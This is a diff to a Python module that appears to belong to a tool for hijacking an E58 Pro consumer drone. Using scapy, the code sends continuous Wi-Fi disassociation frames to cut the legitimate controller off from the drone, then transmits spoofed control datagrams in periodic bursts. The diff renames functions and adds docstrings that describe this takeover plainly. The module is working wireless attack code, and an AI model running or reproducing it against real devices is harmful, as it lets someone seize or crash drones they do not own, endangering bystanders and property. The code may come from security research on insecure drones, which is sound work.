@@ -12,7 +12,6 @@ import os
 
 from scapy.layers.dot11 import RadioTap, Dot11, Dot11Disas
 from scapy.layers.inet import UDP
-from scapy.layers.l2 import LLC, SNAP
 from scapy.packet import Packet
 
 from e58pro.command_payloads import new_video_ack, E58ProBasePayload
@@ -54,7 +53,15 @@ def _new_deauth(dst_mac: str, src_mac: str, ap_mac: str, seq_num: int, reason: i
            DOT11_DISCONNECT_TYPE(reason=reason)
 
 
-def _start_deauther(interface_name: str, sender_l4_base: UDP, sender_func: Callable, termination_event: TEvent) -> None:
+def _start_disassociator(interface_name: str,
+                         sender_l4_base: UDP,
+                         sender_func: Callable,
+                         termination_event: TEvent
+                         ) -> None:
+    """Starts a thread that attempts to constantly disassociate the connection between the controller and drone
+     represented by the passed layer 4 datagram base.
+    The thread terminates when the passed Event is set.
+    """
     drone_mac = sender_l4_base[Dot11].addr1
     controller_mac = sender_l4_base[Dot11].addr2
     deauth = _new_deauth(controller_mac, drone_mac, drone_mac, 1, DEAUTH_REASON)
@@ -91,13 +98,17 @@ def _transmission_routine(interface_name: str,
                           sender_l4_base: UDP,
                           sender_func: Callable,
                           **sender_func_kwargs) -> None:
+    """Starts a thread to disassociate the identified controller from the drone. It then periodically sends bursts
+    of command datagrams; potentially modifying them by popping from the queue and applying any requested
+    modifications.
+    Terminates when the passed termination event is set."""
     logging.basicConfig(filename="child_process.log",
                         format="%(asctime)s: %(levelname)s at %(filename)s/%(funcName)s: %(message)s",
                         level=logging.INFO)
 
     logging.info(f"PID: {os.getpid()}")
 
-    _start_deauther(interface_name, sender_l4_base, sender_func, termination_event)
+    _start_disassociator(interface_name, sender_l4_base, sender_func, termination_event)
     persisted_state = sender_l4_base / new_video_ack(0)
     seq = 0
     while not termination_event.is_set():
@@ -135,7 +146,8 @@ def _transmission_routine(interface_name: str,
 
 class TransmitterProcessController:
     """Manages the periodic sending of commands.
-    Requests to modify the command before it's sent can be submitted using the send_request method."""
+    Requests to modify commands before they're sent can be submitted using the send_request method.
+    """
     def __init__(self,
                  interface_name: str,
                  sends_per_second: int,
@@ -151,9 +163,10 @@ class TransmitterProcessController:
                                 name=PROCESS_NAME,
                                 args=(interface_name, sends_per_second,
                                       self._command_request_queue, self._termination_event,
-                                      sender_l4_base, sender_func))
+                                      sender_l4_base, sender_func),
+                                daemon=True)
 
-    def start_process(self):
+    def start(self):
         self._process.start()
 
     def shutdown(self) -> None:
@@ -179,7 +192,7 @@ class TransmitterProcessController:
             return False
 
     def __enter__(self) -> TransmitterProcessController:
-        self.start_process()
+        self.start()
         return self
 
     def __exit__(self, *_) -> None:
